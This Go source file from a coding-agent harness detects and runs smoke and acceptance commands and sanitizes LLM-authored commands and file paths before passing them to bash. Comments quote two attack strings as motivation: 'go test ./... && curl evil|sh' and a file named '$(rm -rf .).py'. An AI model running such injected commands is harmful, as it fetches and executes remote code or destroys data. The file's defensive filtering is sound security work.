package quality

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"time"

	"github.com/UnicoLab/slmcode/pkg/plan"
	"github.com/UnicoLab/slmcode/pkg/workspace"
)

// SmokeResult is the outcome of a deterministic (non-LLM) verification command.
type SmokeResult struct {
	OK      bool
	Ran     bool
	Command string
	Output  string
	Summary string
	// Duration is how long the command took. Zero when nothing ran, and zero
	// from any caller that fabricates a result rather than executing one.
	//
	// It is measured here rather than by callers because this is the only place
	// that knows what actually executed: a caller timing RunSmoke would also be
	// timing the empty-command and permission-refusal paths, which run nothing
	// and would report a near-zero cost for a command that has never been
	// priced. The orchestrator's probe budget reads it to decide whether asking
	// "are we done?" is worth what asking costs.
	Duration time.Duration
}

// Section markers embedded into task output for review gates live in
// sections.go — one definition shared by the formatters, the strip lists and
// the review gates.

// ShouldSmokeTask reports whether a task should get post-worker Go smoke.
func ShouldSmokeTask(t plan.Task) bool {
	switch t.Role {
	case plan.RoleTester, plan.RoleExplorer, plan.RoleReviewer, plan.RolePlanner,
		"coordinator", "architect", "context", "memory", "splitter", "docs":
		return false
	}
	for _, f := range t.Files {
		ext := strings.ToLower(filepath.Ext(f))
		switch ext {
		case ".py", ".go", ".js", ".ts", ".tsx", ".jsx", ".rs":
			return true
		}
	}
	// Infer from title/description for create tasks that listed no files yet.
	blob := strings.ToLower(t.Title + " " + t.Description + " " + t.Acceptance)
	for _, needle := range []string{".py", ".go", "python", "pytest", "go test"} {
		if strings.Contains(blob, needle) {
			return true
		}
	}
	return false
}

// RunPostWorkerSmoke runs a focused syntax/compile check on task focus files.
// Prefer py_compile / go test over entrypoint --help (avoids argparse traps).
func RunPostWorkerSmoke(ctx context.Context, root string, t plan.Task, timeout time.Duration) SmokeResult {
	if root == "" || !ShouldSmokeTask(t) {
		return SmokeResult{OK: true, Ran: false, Summary: "skipped"}
	}

	// Detect project language to avoid running wrong-language commands
	// (e.g. python -m py_compile in a Go-only project).
	projLang := DetectProjectLanguage(root)

	cmd := DetectPostWorkerCommand(root, t.Files)
	if cmd == "" {
		return SmokeResult{OK: true, Ran: false, Summary: "no smoke command"}
	}

	// Filter: skip if the smoke command language doesn't match the project language.
	cmdLang := commandLanguage(cmd)
	if projLang != "" && cmdLang != "" && projLang != cmdLang {
		return SmokeResult{OK: true, Ran: false, Summary: "smoke skipped: command language mismatch with project"}
	}

	// Fast-path: Go project with no _test.go files → use go vet instead of go test
	// (go test on a package with no tests is wasteful; go vet is faster and still catches errors).
	// indexAtWordStart, not Contains: "cargo test" contains "go test", so a
	// polyglot repo detected as Go would have had its Rust command rewritten to
	// the nonexistent "cargo vet".
	if goTestAt := indexAtWordStart(cmd, "go test"); projLang == "go" && goTestAt >= 0 && !hasGoTestFiles(root) {
		cmd = cmd[:goTestAt] + strings.Replace(cmd[goTestAt:], "go test", "go vet", 1)
		// go vet has no -short/-race/-count flags — strip test-only flags so the
		// rewritten command stays valid ("go vet . -short" is a hard error).
		cmd = strings.ReplaceAll(cmd, " -short", "")
		cmd = strings.ReplaceAll(cmd, " -race", "")
		cmd = strings.ReplaceAll(cmd, " -count=1", "")
		cmd = strings.TrimSpace(cmd)
	}

	return RunSmoke(ctx, root, cmd, timeout)
}

// DetectPostWorkerCommand picks a fast per-task smoke command for changed files.
func DetectPostWorkerCommand(root string, files []string) string {
	var py, goFiles, jsFiles, tsFiles []string
	for _, f := range files {
		f = strings.TrimSpace(f)
		// Focus paths are LLM-authored; anything that is not a plain path is
		// dropped rather than quoted, so it can never reach a command line.
		if !SafeFocusPath(f) {
			continue
		}
		switch strings.ToLower(filepath.Ext(f)) {
		case ".py":
			if fileExists(filepath.Join(root, f)) {
				py = append(py, f)
			}
		case ".go":
			if fileExists(filepath.Join(root, f)) {
				goFiles = append(goFiles, f)
			}
		case ".js", ".mjs", ".cjs":
			if fileExists(filepath.Join(root, f)) {
				jsFiles = append(jsFiles, f)
			}
		case ".ts", ".tsx", ".jsx":
			if fileExists(filepath.Join(root, f)) {
				tsFiles = append(tsFiles, f)
			}
		}
	}
	if len(py) > 0 {
		quoted := make([]string, 0, len(py))
		for _, p := range py {
			quoted = append(quoted, shellQuote(p))
		}
		return "python -m py_compile " + strings.Join(quoted, " ")
	}
	if len(goFiles) > 0 {
		// No go.mod → a single-file/script Go layout. `go test`/`go vet` need a
		// module and would false-fail ("go.mod file not found"), so use a
		// module-free syntax check instead (gofmt -e exits 2 on parse errors).
		if !fileExists(filepath.Join(root, "go.mod")) {
			quoted := make([]string, 0, len(goFiles))
			for _, g := range goFiles {
				quoted = append(quoted, shellQuote(g))
			}
			return "gofmt -e " + strings.Join(quoted, " ")
		}
		pkgs := map[string]bool{}
		for _, g := range goFiles {
			dir := filepath.Dir(g)
			if dir == "." || dir == "" {
				pkgs["."] = true
			} else {
				pkgs["./"+filepath.ToSlash(dir)] = true
			}
		}
		var list []string
		for p := range pkgs {
			list = append(list, p)
		}
		if len(list) == 1 {
			return "go test " + list[0] + " -short"
		}
		return "go test ./... -short"
	}
	if len(jsFiles) > 0 {
		// Syntax-check each JS file (no test runner required).
		parts := make([]string, 0, len(jsFiles))
		for _, p := range jsFiles {
			parts = append(parts, "node --check "+shellQuote(p))
		}
		return strings.Join(parts, " && ")
	}
	if len(tsFiles) > 0 {
		if cmd := detectTypeScriptSmokeCommand(root); cmd != "" {
			return cmd
		}
	}
	return ""
}

func detectTypeScriptSmokeCommand(root string) string {
	scripts := npmScripts(root)
	for _, name := range []string{"typecheck", "type-check", "check-types"} {
		if strings.TrimSpace(scripts[name]) != "" {
			return "npm run -s " + name
		}
	}
	for _, name := range []string{"lint", "check"} {
		if scriptLooksLikeTypeScriptCheck(scripts[name]) {
			return "npm run -s " + name
		}
	}
	if fileExists(filepath.Join(root, "tsconfig.json")) &&
		fileExists(filepath.Join(root, "node_modules", ".bin", "tsc")) {
		return "./node_modules/.bin/tsc --noEmit --pretty false"
	}
	return ""
}

func npmScripts(root string) map[string]string {
	data, err := os.ReadFile(filepath.Join(root, "package.json"))
	if err != nil {
		return nil
	}
	var pkg struct {
		Scripts map[string]string `json:"scripts"`
	}
	if err := json.Unmarshal(data, &pkg); err != nil {
		return nil
	}
	return pkg.Scripts
}

func scriptLooksLikeTypeScriptCheck(script string) bool {
	lower := strings.ToLower(script)
	return strings.Contains(lower, "tsc") || strings.Contains(lower, "vue-tsc")
}

// IsWeakQACommand reports whether a QA/smoke command is syntax-only and must
// not alone clear tester rejection or promote escalated tasks (TestSLMs:
// compileall passed on empty packages + placeholders → false success).
func IsWeakQACommand(cmd string) bool {
	lower := strings.ToLower(strings.TrimSpace(cmd))
	if lower == "" {
		return true
	}
	if strings.Contains(lower, "pytest") || strings.Contains(lower, "go test") ||
		strings.Contains(lower, "npm test") || strings.Contains(lower, "cargo test") ||
		strings.Contains(lower, "make test") ||
		strings.Contains(lower, "python main.py") || strings.Contains(lower, "python app.py") {
		return false
	}
	return strings.Contains(lower, "compileall") ||
		strings.Contains(lower, "py_compile") ||
		strings.Contains(lower, "node --check")
}

// DetectProjectCommand picks a project-level verify command (finalize / QA gate).
func DetectProjectCommand(root string) string {
	if root == "" {
		return ""
	}
	if fileExists(filepath.Join(root, "go.mod")) {
		return "go test ./... -short"
	}
	if fileExists(filepath.Join(root, "package.json")) {
		data, _ := os.ReadFile(filepath.Join(root, "package.json"))
		if bytes.Contains(data, []byte(`"test"`)) {
			return "npm test --silent"
		}
		return ""
	}
	if py := detectPythonProjectCommand(root); py != "" {
		return py
	}
	if fileExists(filepath.Join(root, "Cargo.toml")) {
		return "cargo test --quiet"
	}
	if fileExists(filepath.Join(root, "pom.xml")) {
		return "mvn -q test"
	}
	if fileExists(filepath.Join(root, "build.gradle")) || fileExists(filepath.Join(root, "build.gradle.kts")) {
		return "./gradlew test"
	}
	if fileExists(filepath.Join(root, "CMakeLists.txt")) {
		return "cmake --build build"
	}
	if fileExists(filepath.Join(root, "Makefile")) {
		data, _ := os.ReadFile(filepath.Join(root, "Makefile"))
		if bytes.Contains(data, []byte("\ntest:")) || bytes.Contains(data, []byte("\ntest :")) {
			return "make test"
		}
	}
	if hasHTMLSources(root) {
		// Static browser project: gate on a usable, non-empty HTML entrypoint
		// (no pytest / npm test / go test for plain HTML/CSS/JS).
		return `test -n "$(find . -name '*.html' -not -path '*/node_modules/*' -type f -size +0c | head -1)"`
	}
	return ""
}

// DetectProjectCommandWithPack uses legacy workspace heuristics.
// Callers should prefer blocks.ResolveQAGateCommand for active pack resolution first.
func DetectProjectCommandWithPack(root, activePack string) string {
	if root == "" {
		return ""
	}
	return DetectProjectCommand(root)
}

func detectPythonProjectCommand(root string) string {
	hasPyProject := fileExists(filepath.Join(root, "pyproject.toml"))
	hasPytestIni := fileExists(filepath.Join(root, "pytest.ini"))
	hasTestsDir := dirExists(filepath.Join(root, "tests"))
	hasTestFiles := hasPythonTests(root)
	hasReq := fileExists(filepath.Join(root, "requirements.txt"))
	hasSetup := fileExists(filepath.Join(root, "setup.py")) || fileExists(filepath.Join(root, "setup.cfg"))
	hasUV := fileExists(filepath.Join(root, "uv.lock"))
	hasMain := fileExists(filepath.Join(root, "main.py")) || fileExists(filepath.Join(root, "app.py"))

	pytestCmd := "python -m pytest -q"
	if hasUV {
		pytestCmd = "uv run pytest -q"
	}

	if hasPytestIni || hasTestsDir || hasTestFiles {
		return pytestCmd
	}
	// Greenfield shape (entrypoint + deps): fail closed on pytest — compileall
	// alone was the TestSLMs false-success path (empty packages "pass").
	if hasMain && (hasReq || hasPyProject || hasSetup) {
		return pytestCmd
	}
	if hasPyProject {
		data, _ := os.ReadFile(filepath.Join(root, "pyproject.toml"))
		if bytes.Contains(bytes.ToLower(data), []byte("pytest")) {
			return pytestCmd
		}
		return "python -m compileall -q ."
	}
	if hasReq || hasSetup || hasPythonSources(root) {
		return "python -m compileall -q ."
	}
	return ""
}

// safeAcceptancePrefixes are the only shell fragments we auto-run from task
// acceptance text (never free-form LLM shell).
var safeAcceptancePrefixes = []string{
	"python -m pytest",
	"python -m py_compile",
	"python -m compileall",
	"python main.py",
	"python app.py",
	"uv run pytest",
	"pytest ",
	"pytest\t",
	"go test",
	"npm test",
	// `npm run <script>` — lint, typecheck and build are real verifications a
	// criterion should be allowed to name, and refusing them was why "the
	// project builds" could only ever come back UNVERIFIED on a JS/TS project.
	// Safe to admit only because isLongRunningServer refuses the scripts that
	// never return (dev/start/serve/preview/watch), which share this prefix.
	"npm run",
	"yarn run",
	"pnpm run",
	"cargo test",
	"make test",
}

// ExtractAcceptanceCommands pulls whitelisted verify commands from acceptance text.
func ExtractAcceptanceCommands(acceptance string) []string {
	raw := strings.TrimSpace(acceptance)
	if raw == "" {
		return nil
	}
	// Normalize separators so we can scan chunks.
	normalized := strings.NewReplacer(
		";", "\n",
		" and ", "\n",
		" AND ", "\n",
		" then ", "\n",
		" → ", "\n",
		"->", "\n",
	).Replace(raw)
	var out []string
	seen := map[string]bool{}
	for _, line := range strings.Split(normalized, "\n") {
		line = strings.TrimSpace(line)
		if line == "" {
			continue
		}
		lower := strings.ToLower(line)
		for _, prefix := range safeAcceptancePrefixes {
			p := strings.ToLower(strings.TrimSpace(prefix))
			idx := indexAtWordStart(lower, p)
			if idx < 0 {
				continue
			}
			cmd := strings.TrimSpace(line[idx:])
			// Cut trailing prose after the command (period+space, " exits", " prints").
			for _, stop := range append([]string{" exits", " prints", " returns", " —", " - ", ". ", " ("},
				acceptanceAssertionTails...) {
				i := strings.Index(strings.ToLower(cmd), stop)
				// ". " must not chop a package pattern: "go test ./... -short"
				// used to be truncated to the unusable "go test ./".
				if stop == ". " && i > 0 && cmd[i-1] == '.' {
					i = -1
				}
				if i >= len(p) {
					cmd = strings.TrimSpace(cmd[:i])
				}
			}
			cmd = trimAcceptancePunctuation(cmd)
			cmd = SanitizeAcceptanceCommand(cmd, prefix)
			if cmd == "" || seen[cmd] {
				continue
			}
			seen[cmd] = true
			out = append(out, cmd)
			break
		}
	}
	return out
}

// indexAtWordStart is strings.Index constrained to a command-name boundary.
//
// A plain substring search matched a prefix in the MIDDLE of another tool's
// name: "cargo test" contains "go test", so a Rust project's acceptance command
// was rewritten to `go test` and the harness ran the wrong tool entirely —
// silently, and with a failure that looked like the model's fault.
//
// A command name starts at the beginning of the line or after a separator; it
// never starts mid-identifier or mid-path.
func indexAtWordStart(s, sub string) int {
	if sub == "" {
		return -1
	}
	for from := 0; ; {
		i := strings.Index(s[from:], sub)
		if i < 0 {
			return -1
		}
		i += from
		if i == 0 || isCommandBoundary(s[i-1]) {
			return i
		}
		from = i + 1
	}
}

// isCommandBoundary reports whether b can precede the start of a command name.
// Deliberately excludes '/' and '.', so "/usr/bin/cargo test" and
// "tools.cargo test" do not resolve to `go test` either.
func isCommandBoundary(b byte) bool {
	switch b {
	case ' ', '\t', '(', '[', '{', ',', ':', '"', '\'', '`', '|', '&', ';', '>', '<':
		return true
	}
	return false
}

// acceptanceAssertionTails are the natural-language endings an LLM appends to
// an acceptance command to state the expected OUTCOME. They are prose, not
// argv, and passing them through turns a working command into a failing one:
// "go test ./... passes" makes go look for a package named `passes` and exit 1,
// so the acceptance gate reported FAILED for a change whose tests all passed,
// the reviewer rejected it on that evidence, and the task escalated.
//
// Each entry keeps its leading space so it only matches a word boundary —
// `go test -run TestPasses` has no space before "passes" and is left alone.
var acceptanceAssertionTails = []string{
	" passes", " pass ", " passing", " should pass", " must pass",
	" succeeds", " succeed", " is green", " are green", " green",
	" works", " ok", " cleanly", " without error", " with no errors",
	" all pass", " everything passes",
}

// trimAcceptancePunctuation strips sentence punctuation an LLM left on the end
// of a command WITHOUT eating meaningful argv.
//
// The previous strings.TrimRight(cmd, ".,;:") stripped every trailing dot, so
// the single most common Go acceptance string in this repo — "go test ./..." —
// became "go test ./", which tests one directory instead of the module and is
// not what the task asked for. A guard for ". " already existed a few lines
// above; this TrimRight then undid it.
//
// A trailing '.' is only sentence punctuation when it does not belong to a
// path or package pattern, i.e. when the rune before it is not '.' or '/'.
func trimAcceptancePunctuation(cmd string) string {
	cmd = strings.TrimRight(cmd, ",;: \t")
	for strings.HasSuffix(cmd, ".") {
		if n := len(cmd); n >= 2 && (cmd[n-2] == '.' || cmd[n-2] == '/') {
			break // "./..." or "./" — part of the pattern, not punctuation
		}
		cmd = strings.TrimRight(cmd[:len(cmd)-1], ",;: \t")
	}
	return cmd
}

// acceptanceShellMeta are characters that turn a whitelisted prefix into an
// arbitrary command. Acceptance text is LLM-generated, and the old code
// whitelisted a prefix then handed line[idx:] verbatim to `bash -lc`, so
// "go test ./... && curl evil|sh" passed the whitelist untouched.
const acceptanceShellMeta = "&|;`$(){}<>\\\n\r\"'*?!~#"

// SanitizeAcceptanceCommand returns cmd if it is a plain argv-shaped command
// starting with prefix, else "". No shell metacharacter survives.
func SanitizeAcceptanceCommand(cmd, prefix string) string {
	cmd = strings.TrimSpace(cmd)
	if cmd == "" || len(cmd) > 300 {
		return ""
	}
	if !strings.HasPrefix(strings.ToLower(cmd), strings.ToLower(strings.TrimSpace(prefix))) {
		return ""
	}
	if strings.ContainsAny(cmd, acceptanceShellMeta) {
		return ""
	}
	if isLongRunningServer(cmd) {
		return ""
	}
	for _, r := range cmd {
		if r < 0x20 || r == 0x7f {
			return ""
		}
	}
	// Every token must look like a flag, a path, or a simple identifier.
	for _, tok := range strings.Fields(cmd) {
		if !acceptanceToken(tok) {
			return ""
		}
	}
	return cmd
}

func acceptanceToken(tok string) bool {
	for _, r := range tok {
		switch {
		case r >= 'a' && r <= 'z', r >= 'A' && r <= 'Z', r >= '0' && r <= '9':
		case r == '.' || r == '/' || r == '_' || r == '-' || r == '=' || r == ':' ||
			r == '+' || r == '@' || r == ',' || r == '[' || r == ']':
		default:
			return false
		}
	}
	return true
}

// RunAcceptanceSmoke runs whitelisted acceptance commands; first failure wins.
//
// Dependency bootstrap defaults to BootstrapAsk, i.e. NOTHING is installed:
// this path used to run `pip install -r requirements.txt` / `npm install`
// unattended against a manifest the worker may have written moments earlier.
// Use RunAcceptanceSmokeWithPolicy to opt a trusted caller into auto-install.
func RunAcceptanceSmoke(ctx context.Context, root, acceptance string, timeout time.Duration) SmokeResult {
	return RunAcceptanceSmokeWithPolicy(ctx, root, acceptance, timeout, BootstrapAsk)
}

// RunAcceptanceSmokeWithPolicy is RunAcceptanceSmoke with an explicit
// dependency-bootstrap policy. A pending (ask) or refused (off) bootstrap is
// reported in the result summary rather than silently skipped, so a failure
// caused by missing dependencies is diagnosable.
func RunAcceptanceSmokeWithPolicy(ctx context.Context, root, acceptance string,
	timeout time.Duration, policy BootstrapPolicy) SmokeResult {
	cmds := ExtractAcceptanceCommands(acceptance)
	if len(cmds) == 0 {
		return SmokeResult{OK: true, Ran: false, Summary: "no acceptance commands"}
	}
	var combined strings.Builder
	pending := ""
	for i, cmd := range cmds {
		if i == 0 {
			if bp := PlanBootstrap(root, cmd, policy); bp.Command != "" || bp.Reason != "" {
				switch {
				case bp.Run:
					_ = RunSmoke(ctx, root, bp.Command, timeout) // approved by policy
				case bp.Reason != "":
					pending = bp.Reason
				}
			}
		}
		sr := RunSmoke(ctx, root, cmd, timeout)
		if combined.Len() > 0 {
			combined.WriteString("\n---\n")
		}
		combined.WriteString(sr.Output)
		if !sr.OK {
			sr.Output = combined.String()
			sr.Summary = fmt.Sprintf("%s: acceptance %s", SmokeFailedMarker, cmd)
			if pending != "" {
				sr.Summary += " [" + pending + "]"
			}
			return sr
		}
	}
	out := SmokeResult{
		OK: true, Ran: true,
		Command: strings.Join(cmds, " && "),
		Output:  combined.String(),
		Summary: SmokePassedMarker + ": acceptance",
	}
	if pending != "" {
		out.Summary += " [" + pending + "]"
	}
	return out
}

// FormatAcceptanceSection renders acceptance smoke for task output / review gates.
func FormatAcceptanceSection(sr SmokeResult) string {
	if !sr.Ran {
		return ""
	}
	var b strings.Builder
	b.WriteString("\n\n")
	b.WriteString(AcceptanceSectionHeader)
	b.WriteString("\n")
	if sr.OK {
		b.WriteString(SmokePassedMarker)
	} else {
		b.WriteString(SmokeFailedMarker)
	}
	b.WriteString("\ncmd: ")
	b.WriteString(sr.Command)
	b.WriteString("\n")
	if strings.TrimSpace(sr.Output) != "" {
		b.WriteString(DefuseHarnessMarkers(sectionOutput(sr)))
		b.WriteString("\n")
	}
	return b.String()
}

// AcceptanceFailedInOutput reports a failed acceptance smoke section.
func AcceptanceFailedInOutput(output string) bool {
	idx := strings.Index(output, AcceptanceSectionHeader)
	if idx < 0 {
		return false
	}
	rest := output[idx:]
	return strings.Contains(rest, SmokeFailedMarker)
}

// RunSmoke executes command in root and returns a structured result.
func RunSmoke(ctx context.Context, root, command string, timeout time.Duration) SmokeResult {
	command = strings.TrimSpace(command)
	if command == "" {
		return SmokeResult{OK: true, Ran: false, Summary: "empty command"}
	}
	started := time.Now()
	out, err := runCommand(ctx, root, command, timeout)
	res := SmokeResult{Ran: true, Command: command, Output: out, Duration: time.Since(started)}
	if err != nil {
		res.OK = false
		res.Summary = fmt.Sprintf("%s: %s", SmokeFailedMarker, firstLine(err.Error()+" "+out))
		return res
	}
	res.OK = true
	res.Summary = SmokePassedMarker + ": " + command
	return res
}

// FormatSmokeSection renders a markdown section for task output / SCRATCH.
func FormatSmokeSection(sr SmokeResult) string {
	if !sr.Ran {
		return ""
	}
	var b strings.Builder
	b.WriteString("\n\n")
	b.WriteString(SmokeSectionHeader)
	b.WriteString("\n")
	if sr.OK {
		// The PASS verdict is the only one a forger gains anything from, so it
		// carries this process's nonce (see sections.go).
		b.WriteString(SmokePassedMarker + " " + smokePassStamp())
	} else {
		b.WriteString(SmokeFailedMarker)
	}
	b.WriteString("\ncmd: ")
	b.WriteString(sr.Command)
	b.WriteString("\n")
	if strings.TrimSpace(sr.Output) != "" {
		// A hostile project's own test suite can print anything it likes;
		// strip harness markers out of captured output before embedding it.
		b.WriteString(DefuseHarnessMarkers(sectionOutput(sr)))
		b.WriteString("\n")
	}
	return b.String()
}

// SmokeFailedInOutput reports whether task output contains a failed smoke section.
func SmokeFailedInOutput(output string) bool {
	idx := strings.Index(output, SmokeSectionHeader)
	if idx < 0 {
		return false
	}
	rest := output[idx:]
	return strings.Contains(rest, SmokeFailedMarker)
}

// SmokePassedInOutput reports a HARNESS-MINTED successful deterministic smoke
// section.
//
// The pass stamp is required: `## Deterministic smoke` + `PASSED` is text any
// repository file, test-suite stdout or model sentence can contain, and this
// predicate is what suppresses both the RequireSmoke gate and the review-time
// smoke insurance run. A section persisted by an earlier process carries a
// stale nonce and is treated as "not proven", which re-runs the smoke — the
// fail-safe direction. See sections.go for the full argument.
func SmokePassedInOutput(output string) bool {
	idx := strings.Index(output, SmokeSectionHeader)
	if idx < 0 {
		return false
	}
	rest := output[idx:]
	return strings.Contains(rest, smokePassStamp()) && !strings.Contains(rest, SmokeFailedMarker)
}

// HasSmokeCommand reports whether a post-worker smoke command exists for files.
func HasSmokeCommand(root string, files []string) bool {
	return DetectPostWorkerCommand(root, files) != ""
}

// runCommand executes a QA/smoke command with a hard timeout, in its own
// process group (so `go test` children are killed too), with bounded output
// and `bash -c` rather than a login shell.
func runCommand(ctx context.Context, root, command string, timeout time.Duration) (string, error) {
	if timeout <= 0 {
		timeout = 3 * time.Minute
	}
	if timeout > 8*time.Minute {
		timeout = 8 * time.Minute
	}
	res := workspace.RunBounded(ctx, root, command, timeout, 128*1024)
	// Head-only truncation used to throw away the END of the output — which is
	// where pytest's FAILURES summary, go test's FAIL lines and tsc/cargo's
	// error summary all live. Failing output additionally gets its failure
	// lines pinned to the top so they survive any further head-only cut made
	// downstream (the QA gate still truncates this text into a corrector
	// prompt).
	out := res.Output
	if res.TimedOut || res.Err != nil {
		out = FailureExcerpt(out, MaxSmokeOutput)
	} else {
		out = TruncateOutput(out, MaxSmokeOutput)
	}
	if res.TimedOut {
		return out, fmt.Errorf("command timed out after %s and its process group was killed: %s",
			timeout, firstLine(command))
	}
	return out, res.Err
}

// DetectProjectLanguage returns the primary language of a project based on
// marker files in the root directory. Returns "" when no marker is found.
func DetectProjectLanguage(root string) string {
	if root == "" {
		return ""
	}
	if fileExists(filepath.Join(root, "go.mod")) {
		return "go"
	}
	// A lone .go file without a go.mod is still Go (single-file/script layout).
	if hasGoSources(root) {
		return "go"
	}
	if fileExists(filepath.Join(root, "package.json")) {
		return "javascript"
	}
	if fileExists(filepath.Join(root, "pyproject.toml")) ||
		fileExists(filepath.Join(root, "setup.py")) ||
		fileExists(filepath.Join(root, "setup.cfg")) ||
		fileExists(filepath.Join(root, "requirements.txt")) ||
		fileExists(filepath.Join(root, "pytest.ini")) ||
		hasPythonSources(root) {
		return "python"
	}
	if fileExists(filepath.Join(root, "Cargo.toml")) {
		return "rust"
	}
	if fileExists(filepath.Join(root, "pom.xml")) ||
		fileExists(filepath.Join(root, "build.gradle")) ||
		fileExists(filepath.Join(root, "build.gradle.kts")) {
		return "java"
	}
	if fileExists(filepath.Join(root, "CMakeLists.txt")) {
		return "cpp"
	}
	if fileExists(filepath.Join(root, "Makefile")) {
		// Makefile is ambiguous; check for secondary markers.
		if fileExists(filepath.Join(root, "go.mod")) {
			return "go"
		}
		if hasPythonSources(root) {
			return "python"
		}
	}
	if hasHTMLSources(root) {
		return "html"
	}
	return ""
}

// commandLanguage returns the language a smoke command targets, or "" if unknown.
func commandLanguage(cmd string) string {
	lower := strings.ToLower(strings.TrimSpace(cmd))
	if strings.HasPrefix(lower, "go ") {
		return "go"
	}
	if strings.HasPrefix(lower, "python") || strings.HasPrefix(lower, "uv ") || strings.HasPrefix(lower, "pytest") {
		return "python"
	}
	if strings.HasPrefix(lower, "node ") || strings.HasPrefix(lower, "npm ") {
		return "javascript"
	}
	if strings.HasPrefix(lower, "cargo ") {
		return "rust"
	}
	return ""
}

// hasGoTestFiles reports whether any _test.go files exist under root (recursive).
func hasGoTestFiles(root string) bool {
	var found bool
	_ = filepath.WalkDir(root, func(path string, d os.DirEntry, err error) error {
		if err != nil || found {
			if found {
				return filepath.SkipAll
			}
			return nil
		}
		if d.IsDir() {
			base := d.Name()
			if strings.HasPrefix(base, ".") || base == "vendor" || base == "node_modules" {
				return filepath.SkipDir
			}
			return nil
		}
		if strings.HasSuffix(d.Name(), "_test.go") {
			found = true
		}
		return nil
	})
	return found
}

func fileExists(path string) bool {
	_, err := os.Stat(path)
	return err == nil
}

func dirExists(path string) bool {
	st, err := os.Stat(path)
	return err == nil && st.IsDir()
}

func hasPythonTests(root string) bool {
	entries, err := os.ReadDir(root)
	if err != nil {
		return false
	}
	for _, e := range entries {
		name := e.Name()
		if e.IsDir() {
			continue
		}
		if strings.HasPrefix(name, "test_") && strings.HasSuffix(name, ".py") {
			return true
		}
		if strings.HasSuffix(name, "_test.py") {
			return true
		}
	}
	return false
}

func hasPythonSources(root string) bool {
	entries, err := os.ReadDir(root)
	if err != nil {
		return false
	}
	for _, e := range entries {
		name := e.Name()
		if strings.HasPrefix(name, ".") || name == "venv" || name == ".venv" {
			continue
		}
		if !e.IsDir() && strings.HasSuffix(name, ".py") {
			return true
		}
	}
	return false
}

func hasHTMLSources(root string) bool {
	entries, err := os.ReadDir(root)
	if err != nil {
		return false
	}
	for _, e := range entries {
		name := e.Name()
		if strings.HasPrefix(name, ".") || name == "node_modules" {
			continue
		}
		if e.IsDir() {
			continue
		}
		if strings.HasSuffix(name, ".html") || strings.HasSuffix(name, ".htm") {
			return true
		}
	}
	return false
}

func hasGoSources(root string) bool {
	entries, err := os.ReadDir(root)
	if err != nil {
		return false
	}
	for _, e := range entries {
		name := e.Name()
		if strings.HasPrefix(name, ".") || name == "vendor" || name == "node_modules" {
			continue
		}
		if !e.IsDir() && strings.HasSuffix(name, ".go") {
			return true
		}
	}
	return false
}

// shellQuote wraps s in POSIX SINGLE quotes.
//
// Double quotes do NOT suppress $(…), `…` or $VAR, and these paths come from
// LLM-authored task focus files — a file named `$(rm -rf .).py` used to be
// interpolated straight into a bash command line.
func shellQuote(s string) string {
	if s == "" {
		return "''"
	}
	if safeShellWord(s) {
		return s
	}
	return "'" + strings.ReplaceAll(s, "'", `'\''`) + "'"
}

// safeShellWord reports a path that needs no quoting at all.
func safeShellWord(s string) bool {
	for _, r := range s {
		switch {
		case r >= 'a' && r <= 'z', r >= 'A' && r <= 'Z', r >= '0' && r <= '9':
		case r == '.' || r == '/' || r == '_' || r == '-' || r == '+' || r == '@':
		default:
			return false
		}
	}
	return true
}

// SafeFocusPath reports whether a task focus path may be placed on a command
// line at all. Anything outside [A-Za-z0-9._/@+-] is rejected before quoting,
// as defense in depth: no shell metacharacter, newline, or NUL ever reaches
// bash, regardless of quoting bugs.
func SafeFocusPath(p string) bool {
	p = strings.TrimSpace(p)
	if p == "" || len(p) > 512 {
		return false
	}
	if strings.HasPrefix(p, "-") || strings.Contains(p, "..") {
		return false
	}
	return safeShellWord(p)
}

func firstLine(s string) string {
	s = strings.TrimSpace(s)
	if i := strings.IndexByte(s, '\n'); i >= 0 {
		return strings.TrimSpace(s[:i])
	}
	return s
}

// sectionOutput renders a command's output for a prompt section.
//
// A FAILING command gets its failure lines pinned to the top: this text is what
// the reviewer and the corrector read, and head-only truncation routinely cut
// the assertion off the bottom.
func sectionOutput(sr SmokeResult) string {
	out := strings.TrimSpace(sr.Output)
	if sr.OK {
		return TruncateOutput(out, MaxSectionOutput)
	}
	return FailureExcerpt(out, MaxSectionOutput)
}

// serverScripts are the package scripts that START A SERVER and never return.
//
// `npm run` is whitelisted because `npm run lint` and `npm run typecheck` are
// exactly the verifications this gate exists to run. `npm run dev` shares that
// prefix and does not terminate — it serves until something kills it, which for
// an auto-run acceptance means burning the task's entire timeout and learning
// nothing. Measured: a live splitter wrote `npm run dev passes` as a tester
// task's acceptance, which is not a proposition that can pass at all.
//
// Matched on the SCRIPT name rather than the runner, so npm/yarn/pnpm/bun all
// resolve the same way.
var serverScripts = []string{"dev", "start", "serve", "preview", "watch"}

// isLongRunningServer reports whether a command starts a server instead of
// verifying something.
func isLongRunningServer(cmd string) bool {
	f := strings.Fields(strings.ToLower(strings.TrimSpace(cmd)))
	if len(f) == 0 {
		return false
	}
	switch f[0] {
	case "npm", "yarn", "pnpm", "bun":
		// `npm start` is its own verb; the rest are `<runner> run <script>`.
		if len(f) >= 2 && f[1] == "start" {
			return true
		}
		if len(f) >= 3 && f[1] == "run" {
			for _, s := range serverScripts {
				if f[2] == s {
					return true
				}
			}
		}
		// yarn/pnpm/bun allow the bare form: `pnpm dev`.
		if len(f) >= 2 && f[0] != "npm" {
			for _, s := range serverScripts {
				if f[1] == s {
					return true
				}
			}
		}
	case "vite", "serve", "http-server", "live-server":
		return true
	case "next", "nuxt", "remix", "astro":
		return len(f) >= 2 && (f[1] == "dev" || f[1] == "start")
	}
	return false
}
